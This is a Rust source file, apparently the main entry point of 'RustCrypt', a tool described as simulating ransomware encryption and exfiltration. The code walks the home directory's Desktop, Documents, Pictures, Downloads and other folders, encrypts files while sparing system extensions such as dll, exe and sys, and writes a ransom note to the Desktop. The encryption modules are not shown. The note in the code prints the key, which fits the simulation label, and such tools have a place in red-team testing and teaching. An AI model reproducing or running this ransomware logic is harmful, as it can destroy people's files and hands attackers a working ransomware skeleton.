use clap::{Arg, Command};
use std::fs::File;
use std::io::{self, Write};
use std::path::Path;
mod encrypt;
mod decrypt;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let rustcrypt = r#"
        ____             __  ______                 __ 
       / __ \__  _______/ /_/ ____/______  ______  / /_
      / /_/ / / / / ___/ __/ /   / ___/ / / / __ \/ __/
     / _, _/ /_/ (__  ) /_/ /___/ /  / /_/ / /_/ / /_  
    /_/ |_|\__,_/____/\__/\____/_/   \__, / .___/\__/  
                                    /____/_/           
    
    Simulates ransomware encryption and exfiltration.
    "#;
    let matches = Command::new("RustCrypt")
        .version("1.0")
        .author("R4z1xx")
        .about(rustcrypt)
        .arg(
            Arg::new("encrypt")
                .short('e')
                .long("encrypt")
                .help("Encrypts files using default/custom key")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("decrypt")
                .short('d')
                .long("decrypt")
                .help("Decrypts previously encrypted files")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("key")
                .short('k')
                .long("key")
                .help("Encryption/Decryption key")
                .action(clap::ArgAction::Set)
        )
        .get_matches();

    let home_dir = dirs::home_dir().ok_or("Could not determine the home directory")?;

    let folders = vec![
        "Desktop",
        "Contacts",
        "Documents",
        "Pictures",
        "Music",
        "Downloads",
        "Videos",
    ];
    
    println!("{}", rustcrypt);

    if matches.get_flag("encrypt") {
        let key;
        if let Some(k) = matches.get_one::<String>("key") {
            key = k.as_bytes();
        } else {
            key = b"rust_crypt_default_encryption_key";
        }

        let adjusted_key = adjust_key_length(key);

        let excluded_extensions = ["rcry", "README-RustCrypt.txt", "dll", "ini", "sys", "exe", "msi", "NLS", "acm", "nls", "EXE", "dat", "efi", "mui"];

        for folder in &folders {
            let folder_path = home_dir.join(folder);
            if folder_path.exists() {
                encrypt::encrypt_files(&folder_path, &adjusted_key, &excluded_extensions)?;
            }
        }
        println!("Files encrypted successfully");
        write_readme(&key, &home_dir)?;
    } else if matches.get_flag("decrypt") {
        if let Some(key) = matches.get_one::<String>("key") {
            println!("Decrypting files...");
            let key_bytes = adjust_key_length(key.as_bytes());

            for folder in &folders {
                let folder_path = home_dir.join(folder);
                if folder_path.exists() {
                    decrypt::decrypt_files(&folder_path, &key_bytes, &["rcry"])?;
                }
            }
            println!("Files decrypted successfully");
        } else {
            eprintln!("Decryption key is required");
        }
    } else {
        println!("No valid operation specified. Use --help for more information.");
    }

    Ok(())
}

fn adjust_key_length(key: &[u8]) -> [u8; 32] {
    let mut adjusted_key = [0u8; 32];

    if key.len() >= 32 {
        adjusted_key.copy_from_slice(&key[..32]);
    } else {
        adjusted_key[..key.len()].copy_from_slice(key);
    }
    adjusted_key
}

fn write_readme(key: &[u8], home_dir: &Path) -> io::Result<()> {
    let readme_path = home_dir.join("Desktop").join("README-RustCrypt.txt");
    println!("Writing Ransomware note to {:?}", readme_path);
    let mut file = File::create(&readme_path)?;

    let ransom_note = format!(r#"
            ____             __  ______                 __ 
           / __ \__  _______/ /_/ ____/______  ______  / /_
          / /_/ / / / / ___/ __/ /   / ___/ / / / __ \/ __/
         / _, _/ /_/ (__  ) /_/ /___/ /  / /_/ / /_/ / /_  
        /_/ |_|\__,_/____/\__/\____/_/   \__, / .___/\__/  
                                        /____/_/           

        Your files have been encrypted by RustCrypt.
        To decrypt your files, use RustCrypt.exe --decrypt --key <key>
        The decryption key is: {}
    "#, String::from_utf8_lossy(key));

    file.write_all(ransom_note.as_bytes())?;
    Ok(())
}